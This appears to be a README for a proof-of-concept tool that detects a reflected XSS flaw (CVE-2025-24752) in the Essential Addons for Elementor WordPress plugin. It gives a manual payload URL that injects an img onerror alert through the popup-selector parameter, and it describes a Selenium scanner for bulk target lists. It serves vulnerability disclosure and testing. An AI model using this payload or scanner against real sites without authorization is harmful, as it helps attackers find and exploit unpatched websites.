# 🔍 Essential Addons for Elementor XSS Vulnerability Detector

## 🚨 Critical Information
**This tool is for security research and patching purposes only. Do not use it to harm sites. If you find vulnerable sites, report them responsibly to site owners so they can update immediately.**

## ⚠️ Vulnerability Details
A reflected XSS vulnerability in Essential Addons for Elementor affects over 100K+ websites using versions below 6.0.15. This has been assigned **CVE-2025-24752**.

## 👉 Manual POC
```
https://target.com/?popup-selector=<img_src=x_onerror=alert("chirag")>&eael-lostpassword=1
```

## 🖼️ Screenshots
![XSS Proof of Concept](https://github.com/user-attachments/assets/4167280d-787d-45cd-81eb-4a5c25368885)
![Alert Demonstration](https://github.com/user-attachments/assets/50d75f05-1392-4acf-9889-525e54ca5128)

## 🔧 Requirements
```bash
pip install selenium webdriver-manager
```

## ⚙️ Usage
```bash
python poc.py targets.txt
```

## ✅ Features
- **100% Accurate Detection**: Unlike nuclei or httpx tools, this script confirms XSS by actually loading the vulnerable page in a browser and witnessing the alert execution
- **Bulk Scanning**: Can process multiple targets (note: will be slower due to browser-based confirmation)
- **Perfect Detection**: Nuclei template included for plugin detection in assets

## 📝 Detection YAML
A perfect detection template for the plugin in assets is included:
[detect-elementor-for-xss.yaml](https://raw.githubusercontent.com/Sachinart/essential-addons-for-elementor-xss-poc/refs/heads/main/detect-elementor-for-xss.yaml)

## 📚 Additional Information & References
The vulnerability occurs due to insufficient validation and sanitizing of the `popup-selector` query argument, allowing a malicious value to be reflected back at the user. Fixed in version 6.0.15.

For more details: [Patchstack Article](https://patchstack.com/articles/reflected-xss-patched-in-essential-addons-for-elementor-affecting-2-million-sites/)

## ⚠️ Disclaimer
This tool is provided for educational and protective purposes only. Always obtain proper authorization before testing any website for vulnerabilities. The author is not responsible for misuse of this tool.

## 🙏 Acknowledgements
Thanks to responsible security researchers who identified and reported this vulnerability.
